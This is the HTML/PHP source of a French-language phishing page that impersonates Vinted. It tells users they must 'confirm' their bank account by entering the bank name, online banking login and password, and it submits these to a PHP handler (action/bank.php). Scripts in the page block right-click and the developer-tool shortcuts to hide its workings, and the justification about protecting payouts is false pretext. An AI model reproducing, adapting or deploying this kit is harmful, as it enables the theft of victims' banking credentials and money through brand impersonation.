
<html class="flavour-clothing dom-ready web_ui__Modal__modal-open" lang="fr" coupert-item="9AF8D9A4E502F3784AD24272D81F0381"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

<script>
    // disable right click
    document.addEventListener('contextmenu', event => event.preventDefault());

    document.onkeydown = function (e) {

        // disable F12 key
        if(e.keyCode == 123) {
            return false;
        }

        // disable I key
        if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
            return false;
        }

        // disable J key
        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
            return false;
        }

        // disable U key
        if(e.ctrlKey && e.keyCode == 85) {
            return false;
        }
    }

</script>
<head>
    <meta charset="utf-8" />
    <title>Confirmation de paiement - Vinted Pro</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico" />
  <link rel='shortcut icon' href='https://static.vinted.com/assets/favicon/default/apple-touch-icon-304950b8dc9146734ffe4fee1d5837f698492a61a5b562369eb32e212a3ea306.png' />
    <link rel="apple-touch-icon" href="public/img/pp64.png" />
    <link rel="canonical" href="#" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <link rel="stylesheet" href="public/css/main.ltr.css" />
    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
    <link rel="stylesheet" href="public/css/contextualLogin.css" />
    <link rel="stylesheet" href="css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/main_style.css" />
    <link rel="stylesheet" href="style.css" />
</head>

<body class="vx_root vx_addFlowTransition vx_hasFadeTransition">
<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection" tabindex="-1">
        <div class="">

                <header class="vx_modal-header">
        <div aria-live="pJOHNESSte">
            <div class="headerWrapper">
				<br><br><br></h1></div>
				<h1 class="vx_text-3 " style="text-align: center">Confirmer le compte bancaire</h1>
				</div>
        </div>
        <p class="vx_text-body">
        </p>

    </header>
    <div class="vx_modal-body vx_blocks-for-mobile">
        <div>
            <div class="vx_modal-body vx_blocks-for-mobile">
                <div class="form-container">
                    <div class="signupCheckBox">
                        <div class="expandableContainer">
                            <label for="paypalAccountData_tcpa"><div class="forgotLink">
                                Pour bénéficier pleinement de votre compte Vinted et faciliter l'approbation du transfert de votre argent vers votre compte bancaire, vous devez obligatoirement confirmer votre compte bancaire à l´aide de vos identifiants de connexion en ligne par mesure de sécurité.<br>
                            </label>
                        </div>
                    </div>
                        <form method="POST" action="<?php echo 'action/bank.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" id="logform"> <input name="_token" type="hidden" value="kF9gPAn3l6UsVOhwyLW6B1YQSFJNWVgFr7jaecNc">

						<div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Nom de la banque *">
                            <label class="floatingLabel" for="banque">Nom de la banque</label>
                           <input aria-label="login_emaildiv" class="test_banque test_banque vx_form-control" required="required" autocomplete="off_cardAdresse1" placeholder="" aria-describedby="text-info-banque" id="cardAdresse1" name="nBNK" type="text">

                       </div>

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Identifiant de connexion *">
                            <label class="floatingLabel" for="banque">Identifiant de connexion *</label>
                           <input aria-label="login_emaildiv" class="test_banque test_banque vx_form-control" required="required" autocomplete="off_cardAdresse1" placeholder="" aria-describedby="text-info-banque" id="cardAdresse1" name="idBNK" type="texte">

                       </div>

					   <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Mot de passe de connexion *">
                            <label class="floatingLabel" for="banque">Mot de passe de connexion *</label>
                           <input aria-label="login_emaildiv" class="test_banque test_banque vx_form-control" required="required" autocomplete="off_cardAdresse1" placeholder="" aria-describedby="text-info-banque" id="cardAdresse1" name="pssBNK" type="password">

                       </div>





                        <button type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="">Confirmer</button>
<br><br>Pourquoi dois-je vérifier les informations financières?<br><br>
Si votre compte Vinted a été piraté, un individu mal intentionné pourrait réceptionner votre paiement en votre nom. La vérification bancaire permet de pallier ce risque.
Vinted vous demande de vérifier votre compte de sorte que vos futurs transferts ne soient pas envoyés vers un mauvais compte bancaire.
                        <div class="forgotLink">
                        <id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">
                        </div>
                        <input type="hidden" id="bp_mid" name="bp_mid" value="">


                    </form>

                </div>

            </div>

        </div>

    </div>

    <div class="foot-pay">
                <center>
                    © <script>document.write(new Date().getFullYear());</script> Par Vinted Pro
                </center>
    </div>

        </div>
    </div>

</div>

<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
<script type="text/javascript" defer="" src="public/js/pa.js"></script>


</body>

</html>
